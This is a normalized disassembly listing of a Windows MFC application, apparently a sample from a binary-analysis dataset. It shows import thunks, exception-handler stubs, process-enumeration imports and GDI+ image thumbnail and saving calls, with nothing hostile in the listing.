retn
sub_409040
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_561
mov [ esi ] r--data
mov [ esi + 0xc8 ] 0x0
mov eax esi
pop esi
retn
sub_409060
retn
sub_409070
retn 0x4
sub_409080
push esi
mov esi ecx
call sub_4090a0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4093d0
call sub_4093e0
jmp sub_4093f0
sub_4093e0
mov ecx rw-data
jmp sub_409040
sub_4093f0
push sub_409400
call sub_40d491
pop ecx
retn
sub_409400
mov ecx rw-data
jmp sub_4090a0
sub_409590
jmp Ordinal_MFC42_641
sub_409f2a
mov ecx [ ebp - 0x1c ]
call Ordinal_MFC42_2393
mov eax r-xdata
retn
sub_409f61
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x38 ] eax
mov eax r-xdata
retn
sub_40a152
mov ecx [ ebp - 0x20 ]
call Ordinal_MFC42_2393
mov eax r-xdata
retn
sub_40a165
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x38 ]
cmp eax 0x3
mov [ ebp - 0x50 ] ecx
mov eax r-xdata
jge r-xdata
retn
mov eax r-xdata
sub_40a4dc
mov ecx [ ebp - 0x50 ]
call Ordinal_MFC42_2393
mov eax r-xdata
retn
sub_40a4ef
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x44 ]
cmp eax 0x3
mov [ ebp - 0x48 ] ecx
mov eax r-xdata
jge r-xdata
retn
mov eax r-xdata
sub_40a590
push esi
mov esi ecx
call sub_409590
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_40a5b0
retn 0x4
sub_40a5c0
mov eax [ Ordinal_MFC42_4234@IAT ]
retn
sub_40a5d0
mov eax r--data
retn
sub_40a860
mov eax [ ecx + 0x78 ]
retn
sub_40aaa0
call Ordinal_MFC42_1168
mov eax [ eax + 0x4 ]
mov ecx [ eax + 0xd0 ]
call sub_4033e0
xor eax eax
retn
sub_40aac0
call Ordinal_MFC42_1168
mov eax [ eax + 0x4 ]
push 0x0
mov ecx [ eax + 0xd0 ]
call sub_403690
xor eax eax
retn
sub_40aae0
call Ordinal_MFC42_1168
mov eax [ eax + 0x4 ]
mov ecx [ eax + 0xcc ]
call sub_402430
xor eax eax
retn
sub_40ab60
call Ordinal_MFC42_1168
mov eax [ eax + 0x4 ]
retn
sub_40ab70
mov eax [ ecx + 0x20 ]
push 0x0
push eax
call [ EnableWindow@IAT ]
retn
sub_40ab80
mov eax [ ecx + 0x20 ]
push 0x1
push eax
call [ EnableWindow@IAT ]
retn
sub_40ab90
call sub_40aba0
jmp sub_40abb0
sub_40aba0
push rw-data
mov ecx rw-data
call Ordinal_MFC42_537
retn
sub_40abb0
push sub_40abc0
call sub_40d491
pop ecx
retn
sub_40abc0
mov ecx rw-data
jmp Ordinal_MFC42_800
sub_40cb60
push esi
mov esi ecx
call sub_40cb80
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
Ordinal_MFC42_2915
jmp [ Ordinal_MFC42_2915@IAT ]
Ordinal_MFC42_922
jmp [ Ordinal_MFC42_922@IAT ]
Ordinal_MFC42_535
jmp [ Ordinal_MFC42_535@IAT ]
Ordinal_MFC42_860
jmp [ Ordinal_MFC42_860@IAT ]
Ordinal_MFC42_800
jmp [ Ordinal_MFC42_800@IAT ]
Ordinal_MFC42_858
jmp [ Ordinal_MFC42_858@IAT ]
Ordinal_MFC42_537
jmp [ Ordinal_MFC42_537@IAT ]
Ordinal_MFC42_540
jmp [ Ordinal_MFC42_540@IAT ]
Ordinal_MFC42_825
jmp [ Ordinal_MFC42_825@IAT ]
Ordinal_MFC42_3811
jmp [ Ordinal_MFC42_3811@IAT ]
Ordinal_MFC42_6657
jmp [ Ordinal_MFC42_6657@IAT ]
Ordinal_MFC42_6881
jmp [ Ordinal_MFC42_6881@IAT ]
Ordinal_MFC42_5204
jmp [ Ordinal_MFC42_5204@IAT ]
Ordinal_MFC42_3229
jmp [ Ordinal_MFC42_3229@IAT ]
Ordinal_MFC42_823
jmp [ Ordinal_MFC42_823@IAT ]
Ordinal_MFC42_1567
jmp [ Ordinal_MFC42_1567@IAT ]
Ordinal_MFC42_690
jmp [ Ordinal_MFC42_690@IAT ]
Ordinal_MFC42_1988
jmp [ Ordinal_MFC42_1988@IAT ]
Ordinal_MFC42_5207
jmp [ Ordinal_MFC42_5207@IAT ]
Ordinal_MFC42_389
jmp [ Ordinal_MFC42_389@IAT ]
Ordinal_MFC42_268
jmp [ Ordinal_MFC42_268@IAT ]
Ordinal_MFC42_2818
jmp [ Ordinal_MFC42_2818@IAT ]
Ordinal_MFC42_939
jmp [ Ordinal_MFC42_939@IAT ]
Ordinal_MFC42_4129
jmp [ Ordinal_MFC42_4129@IAT ]
Ordinal_MFC42_6385
jmp [ Ordinal_MFC42_6385@IAT ]
Ordinal_MFC42_5356
jmp [ Ordinal_MFC42_5356@IAT ]
Ordinal_MFC42_668
jmp [ Ordinal_MFC42_668@IAT ]
Ordinal_MFC42_665
jmp [ Ordinal_MFC42_665@IAT ]
Ordinal_MFC42_1979
jmp [ Ordinal_MFC42_1979@IAT ]
Ordinal_MFC42_5442
jmp [ Ordinal_MFC42_5442@IAT ]
Ordinal_MFC42_353
jmp [ Ordinal_MFC42_353@IAT ]
Ordinal_MFC42_2770
jmp [ Ordinal_MFC42_2770@IAT ]
Ordinal_MFC42_356
jmp [ Ordinal_MFC42_356@IAT ]
Ordinal_MFC42_924
jmp [ Ordinal_MFC42_924@IAT ]
Ordinal_MFC42_5572
jmp [ Ordinal_MFC42_5572@IAT ]
Ordinal_MFC42_2919
jmp [ Ordinal_MFC42_2919@IAT ]
Ordinal_MFC42_1158
jmp [ Ordinal_MFC42_1158@IAT ]
Ordinal_MFC42_610
jmp [ Ordinal_MFC42_610@IAT ]
Ordinal_MFC42_1168
jmp [ Ordinal_MFC42_1168@IAT ]
Ordinal_MFC42_6139
jmp [ Ordinal_MFC42_6139@IAT ]
Ordinal_MFC42_287
jmp [ Ordinal_MFC42_287@IAT ]
Ordinal_MFC42_1175
jmp [ Ordinal_MFC42_1175@IAT ]
Ordinal_MFC42_4058
jmp [ Ordinal_MFC42_4058@IAT ]
Ordinal_MFC42_3181
jmp [ Ordinal_MFC42_3181@IAT ]
Ordinal_MFC42_2781
jmp [ Ordinal_MFC42_2781@IAT ]
Ordinal_MFC42_5856
jmp [ Ordinal_MFC42_5856@IAT ]
Ordinal_MFC42_4278
jmp [ Ordinal_MFC42_4278@IAT ]
Ordinal_MFC42_2764
jmp [ Ordinal_MFC42_2764@IAT ]
Ordinal_MFC42_941
jmp [ Ordinal_MFC42_941@IAT ]
Ordinal_MFC42_3319
jmp [ Ordinal_MFC42_3319@IAT ]
Ordinal_MFC42_1980
jmp [ Ordinal_MFC42_1980@IAT ]
Ordinal_MFC42_536
jmp [ Ordinal_MFC42_536@IAT ]
Ordinal_MFC42_3178
jmp [ Ordinal_MFC42_3178@IAT ]
Ordinal_MFC42_640
jmp [ Ordinal_MFC42_640@IAT ]
Ordinal_MFC42_2414
jmp [ Ordinal_MFC42_2414@IAT ]
Ordinal_MFC42_2405
jmp [ Ordinal_MFC42_2405@IAT ]
Ordinal_MFC42_5785
jmp [ Ordinal_MFC42_5785@IAT ]
Ordinal_MFC42_1640
jmp [ Ordinal_MFC42_1640@IAT ]
Ordinal_MFC42_323
jmp [ Ordinal_MFC42_323@IAT ]
Ordinal_MFC42_2860
jmp [ Ordinal_MFC42_2860@IAT ]
Ordinal_MFC42_4204
jmp [ Ordinal_MFC42_4204@IAT ]
Ordinal_MFC42_5710
jmp [ Ordinal_MFC42_5710@IAT ]
Ordinal_MFC42_3311
jmp [ Ordinal_MFC42_3311@IAT ]
Ordinal_MFC42_5683
jmp [ Ordinal_MFC42_5683@IAT ]
Ordinal_MFC42_3318
jmp [ Ordinal_MFC42_3318@IAT ]
Ordinal_MFC42_5773
jmp [ Ordinal_MFC42_5773@IAT ]
Ordinal_MFC42_2614
jmp [ Ordinal_MFC42_2614@IAT ]
Ordinal_MFC42_4277
jmp [ Ordinal_MFC42_4277@IAT ]
Ordinal_MFC42_4202
jmp [ Ordinal_MFC42_4202@IAT ]
Ordinal_MFC42_5186
jmp [ Ordinal_MFC42_5186@IAT ]
Ordinal_MFC42_354
jmp [ Ordinal_MFC42_354@IAT ]
Ordinal_MFC42_3790
jmp [ Ordinal_MFC42_3790@IAT ]
Ordinal_MFC42_926
jmp [ Ordinal_MFC42_926@IAT ]
Ordinal_MFC42_1105
jmp [ Ordinal_MFC42_1105@IAT ]
Ordinal_MFC42_6648
jmp [ Ordinal_MFC42_6648@IAT ]
Ordinal_MFC42_4673
jmp [ Ordinal_MFC42_4673@IAT ]
Ordinal_MFC42_6375
jmp [ Ordinal_MFC42_6375@IAT ]
Ordinal_MFC42_4486
jmp [ Ordinal_MFC42_4486@IAT ]
Ordinal_MFC42_2554
jmp [ Ordinal_MFC42_2554@IAT ]
Ordinal_MFC42_2512
jmp [ Ordinal_MFC42_2512@IAT ]
Ordinal_MFC42_5731
jmp [ Ordinal_MFC42_5731@IAT ]
Ordinal_MFC42_3922
jmp [ Ordinal_MFC42_3922@IAT ]
Ordinal_MFC42_1089
jmp [ Ordinal_MFC42_1089@IAT ]
Ordinal_MFC42_5199
jmp [ Ordinal_MFC42_5199@IAT ]
Ordinal_MFC42_2396
jmp [ Ordinal_MFC42_2396@IAT ]
Ordinal_MFC42_3346
jmp [ Ordinal_MFC42_3346@IAT ]
Ordinal_MFC42_5300
jmp [ Ordinal_MFC42_5300@IAT ]
Ordinal_MFC42_5302
jmp [ Ordinal_MFC42_5302@IAT ]
Ordinal_MFC42_2725
jmp [ Ordinal_MFC42_2725@IAT ]
Ordinal_MFC42_4079
jmp [ Ordinal_MFC42_4079@IAT ]
Ordinal_MFC42_4698
jmp [ Ordinal_MFC42_4698@IAT ]
Ordinal_MFC42_5307
jmp [ Ordinal_MFC42_5307@IAT ]
Ordinal_MFC42_5289
jmp [ Ordinal_MFC42_5289@IAT ]
Ordinal_MFC42_5714
jmp [ Ordinal_MFC42_5714@IAT ]
Ordinal_MFC42_2982
jmp [ Ordinal_MFC42_2982@IAT ]
Ordinal_MFC42_3147
jmp [ Ordinal_MFC42_3147@IAT ]
Ordinal_MFC42_3259
jmp [ Ordinal_MFC42_3259@IAT ]
Ordinal_MFC42_4465
jmp [ Ordinal_MFC42_4465@IAT ]
Ordinal_MFC42_3136
jmp [ Ordinal_MFC42_3136@IAT ]
Ordinal_MFC42_3262
jmp [ Ordinal_MFC42_3262@IAT ]
Ordinal_MFC42_2985
jmp [ Ordinal_MFC42_2985@IAT ]
Ordinal_MFC42_3081
jmp [ Ordinal_MFC42_3081@IAT ]
Ordinal_MFC42_2976
jmp [ Ordinal_MFC42_2976@IAT ]
Ordinal_MFC42_3830
jmp [ Ordinal_MFC42_3830@IAT ]
Ordinal_MFC42_3831
jmp [ Ordinal_MFC42_3831@IAT ]
Ordinal_MFC42_3825
jmp [ Ordinal_MFC42_3825@IAT ]
Ordinal_MFC42_3079
jmp [ Ordinal_MFC42_3079@IAT ]
Ordinal_MFC42_4080
jmp [ Ordinal_MFC42_4080@IAT ]
Ordinal_MFC42_4622
jmp [ Ordinal_MFC42_4622@IAT ]
Ordinal_MFC42_4424
jmp [ Ordinal_MFC42_4424@IAT ]
Ordinal_MFC42_3738
jmp [ Ordinal_MFC42_3738@IAT ]
Ordinal_MFC42_561
jmp [ Ordinal_MFC42_561@IAT ]
Ordinal_MFC42_815
jmp [ Ordinal_MFC42_815@IAT ]
Ordinal_MFC42_641
jmp [ Ordinal_MFC42_641@IAT ]
Ordinal_MFC42_2514
jmp [ Ordinal_MFC42_2514@IAT ]
Ordinal_MFC42_2621
jmp [ Ordinal_MFC42_2621@IAT ]
Ordinal_MFC42_1247
jmp [ Ordinal_MFC42_1247@IAT ]
Ordinal_MFC42_3874
jmp [ Ordinal_MFC42_3874@IAT ]
Ordinal_MFC42_2864
jmp [ Ordinal_MFC42_2864@IAT ]
Ordinal_MFC42_5355
jmp [ Ordinal_MFC42_5355@IAT ]
Ordinal_MFC42_2393
jmp [ Ordinal_MFC42_2393@IAT ]
Ordinal_MFC42_5265
jmp [ Ordinal_MFC42_5265@IAT ]
Ordinal_MFC42_4376
jmp [ Ordinal_MFC42_4376@IAT ]
Ordinal_MFC42_4853
jmp [ Ordinal_MFC42_4853@IAT ]
Ordinal_MFC42_4998
jmp [ Ordinal_MFC42_4998@IAT ]
Ordinal_MFC42_6052
jmp [ Ordinal_MFC42_6052@IAT ]
Ordinal_MFC42_4078
jmp [ Ordinal_MFC42_4078@IAT ]
Ordinal_MFC42_1775
jmp [ Ordinal_MFC42_1775@IAT ]
Ordinal_MFC42_4407
jmp [ Ordinal_MFC42_4407@IAT ]
Ordinal_MFC42_5241
jmp [ Ordinal_MFC42_5241@IAT ]
Ordinal_MFC42_2385
jmp [ Ordinal_MFC42_2385@IAT ]
Ordinal_MFC42_5163
jmp [ Ordinal_MFC42_5163@IAT ]
Ordinal_MFC42_6374
jmp [ Ordinal_MFC42_6374@IAT ]
Ordinal_MFC42_4353
jmp [ Ordinal_MFC42_4353@IAT ]
Ordinal_MFC42_5280
jmp [ Ordinal_MFC42_5280@IAT ]
Ordinal_MFC42_3798
jmp [ Ordinal_MFC42_3798@IAT ]
Ordinal_MFC42_4837
jmp [ Ordinal_MFC42_4837@IAT ]
Ordinal_MFC42_4441
jmp [ Ordinal_MFC42_4441@IAT ]
Ordinal_MFC42_2648
jmp [ Ordinal_MFC42_2648@IAT ]
Ordinal_MFC42_2055
jmp [ Ordinal_MFC42_2055@IAT ]
Ordinal_MFC42_6376
jmp [ Ordinal_MFC42_6376@IAT ]
Ordinal_MFC42_3749
jmp [ Ordinal_MFC42_3749@IAT ]
Ordinal_MFC42_5065
jmp [ Ordinal_MFC42_5065@IAT ]
Ordinal_MFC42_1727
jmp [ Ordinal_MFC42_1727@IAT ]
Ordinal_MFC42_5261
jmp [ Ordinal_MFC42_5261@IAT ]
Ordinal_MFC42_2446
jmp [ Ordinal_MFC42_2446@IAT ]
Ordinal_MFC42_2124
jmp [ Ordinal_MFC42_2124@IAT ]
Ordinal_MFC42_5277
jmp [ Ordinal_MFC42_5277@IAT ]
Ordinal_MFC42_4627
jmp [ Ordinal_MFC42_4627@IAT ]
Ordinal_MFC42_4425
jmp [ Ordinal_MFC42_4425@IAT ]
Ordinal_MFC42_3597
jmp [ Ordinal_MFC42_3597@IAT ]
Ordinal_MFC42_1146
jmp [ Ordinal_MFC42_1146@IAT ]
Ordinal_MFC42_324
jmp [ Ordinal_MFC42_324@IAT ]
Ordinal_MFC42_6199
jmp [ Ordinal_MFC42_6199@IAT ]
Ordinal_MFC42_4299
jmp [ Ordinal_MFC42_4299@IAT ]
Ordinal_MFC42_4710
jmp [ Ordinal_MFC42_4710@IAT ]
Ordinal_MFC42_2379
jmp [ Ordinal_MFC42_2379@IAT ]
Ordinal_MFC42_755
jmp [ Ordinal_MFC42_755@IAT ]
Ordinal_MFC42_470
jmp [ Ordinal_MFC42_470@IAT ]
Ordinal_MFC42_6215
jmp [ Ordinal_MFC42_6215@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_40d2a0
push esi
mov esi ecx
call ??1type_info@@UAE@XZ
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_40d357
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
retn
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40d36f
sub_40d3ab
push [ ebp - 0x14 ]
call sub_40d3cd
pop ecx
retn
sub_40d3cd
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je r-xdata
jmp ?terminate@@YAXXZ
xor eax eax
retn
sub_40d44d
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
retn
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40d36f
sub_40d465
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_40d491
push [ esp + 0x4 ]
call sub_40d465
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
_ftol
jmp [ _ftol@IAT ]
??1type_info@@UAE@XZ
jmp [ type_info::~type_info@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
?terminate@@YAXXZ
jmp [ terminate@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_40d62c
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_40d63e
xor eax eax
retn
sub_40d641
retn
_controlfp
jmp [ _controlfp@IAT ]
EnumProcesses
jmp [ EnumProcesses@IAT ]
GetModuleBaseNameA
jmp [ GetModuleBaseNameA@IAT ]
EnumProcessModules
jmp [ EnumProcessModules@IAT ]
GetModuleFileNameExA
jmp [ GetModuleFileNameExA@IAT ]
GdipGetImageEncoders
jmp [ GdipGetImageEncoders@IAT ]
GdipGetImageEncodersSize
jmp [ GdipGetImageEncodersSize@IAT ]
GdipSaveImageToFile
jmp [ GdipSaveImageToFile@IAT ]
GdipDisposeImage
jmp [ GdipDisposeImage@IAT ]
GdipAlloc
jmp [ GdipAlloc@IAT ]
GdipGetImageThumbnail
jmp [ GdipGetImageThumbnail@IAT ]
GdipCreateBitmapFromFile
jmp [ GdipCreateBitmapFromFile@IAT ]
GdipFree
jmp [ GdipFree@IAT ]
GdipCloneImage
jmp [ GdipCloneImage@IAT ]
GdiplusStartup
jmp [ GdiplusStartup@IAT ]
sub_40d69c
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call Ordinal_MFC42_1576
retn 0x10
j_sub_40d6e2
jmp sub_40d6e2
sub_40d6e2
push 0x600
push 0x0
call sub_40d6b4
mov [ rw-data ] al
retn
Ordinal_MFC42_1576
jmp [ Ordinal_MFC42_1576@IAT ]
sub_40d700
mov ecx [ ebp - 0x1dc ]
add ecx 0x4
jmp Ordinal_MFC42_800
sub_40d70e
mov ecx [ ebp - 0x1dc ]
add ecx 0x20
jmp Ordinal_MFC42_800
sub_40d71c
mov ecx [ ebp - 0x1dc ]
add ecx 0x24
jmp Ordinal_MFC42_800
sub_40d72a
mov ecx [ ebp - 0x1dc ]
add ecx 0x28
jmp Ordinal_MFC42_800
sub_40d738
mov ecx [ ebp - 0x1dc ]
add ecx 0x2c
jmp Ordinal_MFC42_800
sub_40d746
mov ecx [ ebp - 0x1dc ]
add ecx 0x30
jmp Ordinal_MFC42_800
sub_40d754
mov ecx [ ebp - 0x1dc ]
add ecx 0x34
jmp Ordinal_MFC42_800
sub_40d762
mov ecx [ ebp - 0x1dc ]
add ecx 0x38
jmp Ordinal_MFC42_800
sub_40d770
mov ecx [ ebp - 0x1dc ]
add ecx 0x3c
jmp Ordinal_MFC42_800
sub_40d77e
mov ecx [ ebp - 0x1dc ]
add ecx 0x40
jmp Ordinal_MFC42_800
sub_40d78c
mov ecx [ ebp - 0x1dc ]
add ecx 0x54
jmp Ordinal_MFC42_800
sub_40d79a
mov ecx [ ebp - 0x204 ]
jmp Ordinal_MFC42_800
sub_40d7a5
lea ecx [ ebp - 0x200 ]
jmp Ordinal_MFC42_800
sub_40d7b0
mov ecx [ ebp - 0x204 ]
jmp Ordinal_MFC42_800
sub_40d7bb
lea ecx [ ebp - 0x1f4 ]
jmp Ordinal_MFC42_800
sub_40d7c6
lea ecx [ ebp - 0x1f0 ]
jmp Ordinal_MFC42_800
sub_40d7d1
lea ecx [ ebp - 0x1ec ]
jmp Ordinal_MFC42_800
sub_40d7dc
lea ecx [ ebp - 0x1e8 ]
jmp Ordinal_MFC42_800
sub_40d7e7
lea ecx [ ebp - 0x204 ]
jmp Ordinal_MFC42_800
sub_40d7f2
lea ecx [ ebp - 0x1fc ]
jmp Ordinal_MFC42_800
sub_40d7fd
lea ecx [ ebp - 0x200 ]
jmp Ordinal_MFC42_800
sub_40d808
lea ecx [ ebp - 0x200 ]
jmp Ordinal_MFC42_800
sub_40d813
lea ecx [ ebp - 0x1fc ]
jmp Ordinal_MFC42_800
sub_40d81e
lea ecx [ ebp - 0x204 ]
jmp Ordinal_MFC42_800
sub_40d829
lea ecx [ ebp - 0x200 ]
jmp Ordinal_MFC42_800
sub_40d834
lea ecx [ ebp - 0x1fc ]
jmp Ordinal_MFC42_800
sub_40d83f
lea ecx [ ebp - 0x204 ]
jmp Ordinal_MFC42_800
sub_40d84a
lea ecx [ ebp - 0x200 ]
jmp Ordinal_MFC42_800
sub_40d855
lea ecx [ ebp - 0x1fc ]
jmp Ordinal_MFC42_800
sub_40d860
lea ecx [ ebp - 0x204 ]
jmp Ordinal_MFC42_800
sub_40d86b
lea ecx [ ebp - 0x200 ]
jmp Ordinal_MFC42_800
sub_40d876
lea ecx [ ebp - 0x1fc ]
jmp Ordinal_MFC42_800
sub_40d881
lea ecx [ ebp - 0x204 ]
jmp Ordinal_MFC42_800
sub_40d88c
lea ecx [ ebp - 0x200 ]
jmp Ordinal_MFC42_800
sub_40d897
lea ecx [ ebp - 0x1fc ]
jmp Ordinal_MFC42_800
sub_40d8a2
lea ecx [ ebp - 0x204 ]
jmp Ordinal_MFC42_800
sub_40d8ad
lea ecx [ ebp - 0x1d8 ]
jmp sub_407c70
sub_40d8b8
mov eax r--data
jmp __CxxFrameHandler
sub_40d8d0
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp Ordinal_MFC42_800
sub_40d8db
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp Ordinal_MFC42_800
sub_40d8e6
mov ecx [ ebp - 0x10 ]
add ecx 0x24
jmp Ordinal_MFC42_800
sub_40d8f1
mov ecx [ ebp - 0x10 ]
add ecx 0x28
jmp Ordinal_MFC42_800
sub_40d8fc
mov ecx [ ebp - 0x10 ]
add ecx 0x2c
jmp Ordinal_MFC42_800
sub_40d907
mov ecx [ ebp - 0x10 ]
add ecx 0x30
jmp Ordinal_MFC42_800
sub_40d912
mov ecx [ ebp - 0x10 ]
add ecx 0x34
jmp Ordinal_MFC42_800
sub_40d91d
mov ecx [ ebp - 0x10 ]
add ecx 0x38
jmp Ordinal_MFC42_800
sub_40d928
mov ecx [ ebp - 0x10 ]
add ecx 0x3c
jmp Ordinal_MFC42_800
sub_40d933
mov ecx [ ebp - 0x10 ]
add ecx 0x40
jmp Ordinal_MFC42_800
sub_40d93e
mov eax r--data
jmp __CxxFrameHandler
sub_40d950
lea ecx [ ebp - 0x24 ]
jmp Ordinal_MFC42_800
sub_40d958
mov ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_40d960
mov eax r--data
jmp __CxxFrameHandler
sub_40d970
lea ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_40d978
lea ecx [ ebp - 0x34 ]
jmp Ordinal_MFC42_800
sub_40d980
lea ecx [ ebp - 0x1c ]
jmp Ordinal_MFC42_800
sub_40d988
lea ecx [ ebp - 0x28 ]
jmp Ordinal_MFC42_800
sub_40d990
lea ecx [ ebp - 0x2c ]
jmp Ordinal_MFC42_800
sub_40d998
lea ecx [ ebp - 0x30 ]
jmp Ordinal_MFC42_800
sub_40d9a0
lea ecx [ ebp - 0x5a0 ]
jmp sub_40cb80
sub_40d9ab
lea ecx [ ebp - 0x18 ]
jmp Ordinal_MFC42_800
sub_40d9bb
lea ecx [ ebp - 0x64 ]
jmp Ordinal_MFC42_690
sub_40d9cb
mov eax [ ebp - 0x68 ]
push eax
call sub_4031f0
retn
sub_40d9d5
lea ecx [ ebp + 0x8 ]
jmp Ordinal_MFC42_800
sub_40d9e5
lea ecx [ ebp - 0x80 ]
jmp Ordinal_MFC42_690
sub_40d9ed
mov eax r--data
jmp __CxxFrameHandler
sub_40da08
lea ecx [ ebp - 0x48 ]
jmp Ordinal_MFC42_690
sub_40da10
lea ecx [ ebp - 0x28 ]
jmp Ordinal_MFC42_800
sub_40da18
lea ecx [ ebp - 0x20 ]
jmp Ordinal_MFC42_800
sub_40da20
lea ecx [ ebp - 0x24 ]
jmp Ordinal_MFC42_800
sub_40da28
lea ecx [ ebp - 0x94 ]
jmp Ordinal_MFC42_668
sub_40da33
lea ecx [ ebp - 0x58 ]
jmp Ordinal_MFC42_665
sub_40da3b
lea ecx [ ebp - 0x18 ]
jmp Ordinal_MFC42_800
sub_40da4b
lea ecx [ ebp - 0x48 ]
jmp Ordinal_MFC42_690
sub_40da53
lea ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_40da5b
lea ecx [ ebp - 0x16c ]
jmp sub_407c70
sub_40da66
lea ecx [ ebp - 0x78 ]
jmp Ordinal_MFC42_665
sub_40da6e
lea ecx [ ebp - 0x1c ]
jmp Ordinal_MFC42_800
sub_40da76
lea ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_40da7e
lea ecx [ ebp - 0x2c ]
jmp Ordinal_MFC42_800
sub_40da86
lea ecx [ ebp - 0xa4 ]
jmp Ordinal_MFC42_665
sub_40da91
mov eax r--data
jmp __CxxFrameHandler
sub_40daa0
lea ecx [ ebp + 0x8 ]
jmp Ordinal_MFC42_800
sub_40daa8
mov eax r--data
jmp __CxxFrameHandler
sub_40dac0
lea ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_40dac8
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x4 ]
jmp Ordinal_MFC42_800
sub_40dadf
mov eax r--data
jmp __CxxFrameHandler
sub_40daf0
lea ecx [ ebp + 0x10 ]
jmp Ordinal_MFC42_800
sub_40daf8
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_40db00
lea ecx [ ebp - 0x1c ]
jmp Ordinal_MFC42_800
sub_40db08
mov eax [ ebp - 0x18 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x4 ]
jmp Ordinal_MFC42_800
sub_40db1f
lea ecx [ ebp + 0x8 ]
jmp Ordinal_MFC42_800
sub_40db27
mov eax r--data
jmp __CxxFrameHandler
sub_40db40
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_40db48
lea ecx [ ebp + 0x8 ]
jmp Ordinal_MFC42_800
sub_40db50
mov eax r--data
jmp __CxxFrameHandler
sub_40db60
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_40db68
mov eax r--data
jmp __CxxFrameHandler
sub_40db80
lea ecx [ ebp - 0x18 ]
jmp Ordinal_MFC42_800
sub_40db88
mov eax [ ebp - 0x14 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x8 ]
jmp Ordinal_MFC42_800
sub_40dba7
lea ecx [ ebp - 0x48 ]
jmp Ordinal_MFC42_690
sub_40dbaf
lea ecx [ ebp - 0x20 ]
jmp Ordinal_MFC42_800
sub_40dbb7
lea ecx [ ebp - 0x24 ]
jmp Ordinal_MFC42_800
sub_40dbbf
mov eax r--data
jmp __CxxFrameHandler
sub_40dbd0
mov ecx [ ebp - 0x10 ]
add ecx 0x8
jmp Ordinal_MFC42_800
sub_40dbdb
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp Ordinal_MFC42_610
sub_40dbe6
mov eax r--data
jmp __CxxFrameHandler
sub_40dbf0
mov ecx [ ebp - 0x10 ]
add ecx 0x8
jmp Ordinal_MFC42_800
sub_40dbfb
mov eax r--data
jmp __CxxFrameHandler
sub_40dc10
lea ecx [ ebp - 0x28 ]
jmp Ordinal_MFC42_800
sub_40dc18
lea ecx [ ebp - 0x2c ]
jmp Ordinal_MFC42_800
sub_40dc20
lea ecx [ ebp - 0x20 ]
jmp Ordinal_MFC42_800
sub_40dc28
mov eax r--data
jmp __CxxFrameHandler
sub_40dc40
lea ecx [ ebp + 0x8 ]
jmp Ordinal_MFC42_800
sub_40dc48
mov eax r--data
jmp __CxxFrameHandler
sub_40dc60
lea ecx [ ebp + 0x8 ]
jmp Ordinal_MFC42_800
sub_40dc68
lea ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_40dc70
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x4 ]
jmp Ordinal_MFC42_800
sub_40dc87
mov eax r--data
jmp __CxxFrameHandler
sub_40dca0
lea ecx [ ebp + 0x4 ]
jmp Ordinal_MFC42_800
sub_40dca8
mov eax r--data
jmp __CxxFrameHandler
sub_40dcc0
lea ecx [ ebp + 0x4 ]
jmp Ordinal_MFC42_800
sub_40dcc8
lea ecx [ ebp - 0x28 ]
jmp Ordinal_MFC42_668
sub_40dcd0
lea ecx [ ebp - 0x34 ]
jmp Ordinal_MFC42_800
sub_40dcd8
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_40dce0
mov eax r--data
jmp __CxxFrameHandler
sub_40dcf0
lea ecx [ ebp + 0x4 ]
jmp Ordinal_MFC42_800
sub_40dcf8
lea ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_40dd00
lea ecx [ ebp - 0x10 ]
